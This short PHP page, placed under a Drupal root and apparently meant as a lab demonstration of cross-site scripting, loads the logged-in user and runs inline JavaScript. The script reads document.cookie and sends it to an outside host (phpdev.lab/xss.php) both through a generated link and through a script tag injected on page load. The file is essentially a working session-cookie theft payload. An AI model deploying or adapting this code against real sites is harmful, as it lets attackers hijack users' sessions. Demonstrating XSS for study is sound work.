<?php
/*
 * For testing purpose, place this file under drupal root
 * Used to illustrates XSS
 */
require_once './includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);

?>
<!DOCTYPE html>
<html>
<head>
<title>XSS Demo</title>
<meta charset="utf-8" />
</head>
<body>
	
	<h1>XSS Demo</h1>
	<p>User: <?php echo $GLOBALS['user']->name;?></p>
	<script type="text/javascript">
		console.log(document.cookie);	
		console.log(encodeURI(document.cookie));	
		console.log(encodeURIComponent(document.cookie));	
		console.log(escape(document.cookie));	
		var _url = 'http://phpdev.lab/xss.php?q=' + encodeURIComponent(document.cookie);
		document.write('<a href="' + _url + '" target="_blank">More details</a>');
		var script = document.createElement('script');
		script.setAttribute('type', 'text/javascript');
		script.setAttribute('src', _url);
		document.head.appendChild(script);
	</script>	

</body>
</html>
